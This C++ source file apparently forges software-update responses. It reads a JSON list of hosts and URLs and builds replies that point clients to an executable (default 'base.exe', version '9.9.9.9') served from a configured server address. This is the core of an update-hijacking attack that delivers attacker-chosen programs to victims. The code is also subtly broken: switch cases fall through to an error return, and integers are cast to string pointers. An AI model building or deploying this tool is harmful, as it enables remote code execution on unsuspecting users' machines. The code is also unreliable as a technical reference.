
#include <windows.h>

#include "helper.h"

#include "json/json.h"
#include "FileOper.h"
#include "Utils/Tools.h"
#include "json/reader.h"
#include "SSL/sslPublic.h"
#include "cipher/CryptoUtils.h"


vector < UpdateData> gUpdateData;


int Helper::GetSdkVersion(char* szsdkver, char* szversions[8]) {
	int j = 0;
	szversions[j] = szsdkver;
	j++;
	int sdklen = lstrlenA(szsdkver);
	for (int i = 0; i < sdklen; i++)
	{
		if (szsdkver[i] == '.')
		{
			szsdkver[i] = 0;

			szversions[j] = szsdkver + i + 1;
			j++;
		}
	}

	return j;
}

string ResponseFromRegex(const char* regex, const  char* format,  int size,const char * payload) {

	int cnt = 0;
	const char* params[256];

	int len = strlen(regex);
	for (int i = 0; i < len; i++) {
		switch (regex[i]) {
		case 'P': {
			params[cnt++] = payload;
		}
		case 'S': {
			params[cnt++] = (char*)size;
		}
		case ' ':
		{
		}
		case '\t':
		{
		}
		default: {
			log("%s %d regex:%s format:%s error\r\n", __FUNCTION__, __LINE__, regex, format);
			return "";
		}
		}
	}
	int backsize = cnt * 4 + 8;
	char* update = new char[0x10000];
	int updateLen = 0;
	__asm {
		mov ecx, cnt
		lea ebx, params
		mov eax,cnt
		shl eax,2
		add ebx,eax
		sub ebx,4
		__push_params :
			push[ebx]
			sub ebx, 4
			loop __push_params
			mov eax, format
			push eax
			mov eax, update
			push eax
			call sprintf
			mov updateLen, eax
			mov eax, backsize
			add esp, eax
	}
	string retstr = string(update, updateLen);
	delete []update;
	return retstr;
}


string ObjectFromRegex(const char* regex, const  char* format, const char * url, const char * ver, const char * sign,int size) {

	int cnt = 0;
	const char* params[256];

	int len = strlen(regex);
	for (int i = 0; i < len; i++) {
		switch (regex[i]) {
			case 'U': {
				params[cnt++] = url;
			}

			case 'V': {
				params[cnt++] = ver;
			}
			case 'M': {
				params[cnt++] = sign;
			}
			case 'S': {
				params[cnt++] =(char*) size;
			}
			case ' ':
			{
			}
			case '\t':
			{
			}
			default: {
				log("%s %d regex:%s format:%s error\r\n", __FUNCTION__, __LINE__, regex, format);
				return "";
			}
		}
	}
	int backsize = cnt * 4 + 8;
	char *update = new char[0x10000];
	int updateLen = 0;
	__asm {
		
		lea ebx,params
		mov eax,cnt
		shl eax,2
		add ebx,eax
		sub ebx,4
		mov ecx, cnt
		__push_params:
		push[ebx]
		sub ebx,4
		loop __push_params
		mov eax, format
		push eax
		mov eax,update
		push eax
		call sprintf
		mov updateLen,eax

		add esp,[ backsize]
	}
	string retstr = string(update, updateLen);
	delete []update;
	return retstr;
}

int ObjectParser() {
	int fs = 0;
	char* file = 0;
	int ret = 0;

	string curpath = gLocalPath + "config\\";

	ret = FileOper::fileReader(curpath+"objects.json", &file, &fs);
	if (ret == 0) {
		log("%s %d error\r\n", __FUNCTION__, __LINE__);
		exit(-1);
	}

	Json::Reader reader;

	Json::Value root;

	reader.parse((const char*)file, root,true);

	delete file;

	const Json::Value& obj = root["objects"];
	int size = obj.size();

	for (int i = 0; i < size; i++) {
		string host = obj[i]["host"].asString();
		string url = obj[i]["url"].asString();
		string filename = obj[i]["filename"].asString();
		if (filename == "") {
			filename = "base.exe";
		}
		string version = obj[i]["version"].asString();
		if (version == "") {
			version = "9.9.9.9";
		}
		string md5 = obj[i]["md5"].asString();
		if (md5 == "") {
			char szmd5[64];
			unsigned char binmd5[16];
			CryptoUtils::getUpdateFileMd5(curpath + filename, szmd5, binmd5, 1);
			md5 = string(szmd5,32);
		}
		string formatfn = obj[i]["format"].asString();

		int size = FileOper::getFileSize(curpath + filename);
		string respFormatfn = obj[i]["RespFormat"].asString();

		string regex = obj[i]["regex"].asString();

		string respRegex = obj[i]["respRegex"].asString();
		char download[1024];
		wsprintfA(download, "http://%s/%s", gstrServerIP.c_str(), filename.c_str());

		char *format = 0;
		int formatLen = 0;
		ret = FileOper::fileReader( (curpath+ formatfn).c_str(),&format, &formatLen);


		char* respFormat = 0;
		int respFormatLen = 0;
		ret = FileOper::fileReader((curpath + respFormatfn).c_str(), &respFormat, &respFormatLen);

		string object = ObjectFromRegex(regex.c_str(), format, download, version.c_str(), md5.c_str(),size);

		string resp = ResponseFromRegex(respRegex.c_str(), respFormat,object.length(), object.c_str());

		delete format;
		delete respFormat;

		UpdateData data;
		data.host = host;
		data.response = resp;
		data.url = url;
		gUpdateData.push_back(data);
	}

	return 0;
}



	